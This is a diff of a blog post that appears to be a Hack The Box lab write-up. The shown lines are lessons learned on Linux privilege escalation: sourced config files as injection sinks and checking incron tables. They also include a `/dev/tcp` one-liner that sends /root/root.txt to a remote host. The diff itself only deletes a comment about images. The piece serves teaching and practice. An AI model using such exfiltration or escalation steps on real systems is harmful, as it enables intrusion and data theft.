@@ -230,9 +230,3 @@ This is worth highlighting as a technique on its own. When a command-injection p
 - **Sourced config files are command-injection sinks by design.** Any shell script that does `source /path/to/some.conf` is, semantically, executing that file. If the file is writable by a less-privileged principal than the one running the script, the chain is already broken — there is no "but it only reads variables" defense, because Bash doesn't distinguish at parse time.
 - **Incron is the easy-to-miss third option.** Privilege-escalation enumeration tooling (LinPEAS, linpriv, etc.) does check incron tables, but operators sometimes forget about it because it's less common than cron and systemd. `cat /etc/incron.d/*` and `cat /var/spool/incron/*` belong in every Linux privesc checklist.
 - **You don't always need a shell — you need the artifact.** When reverse shells misbehave on a tight-egress target, single-shot exfiltration of the specific file you need (`cat /root/root.txt > /dev/tcp/...`) is faster, more reliable, and often quieter than trying to debug TTY/pipe interactions over an unreliable command-injection channel.
-
-<!--
-Images to add (save to /assets/img/HTB/Connected/):
-- freepbx_panel.png → Screenshot 1: FreePBX 16.0.40.7 administration panel showing the version banner
-- banner.png → Cover banner image for the post
--->
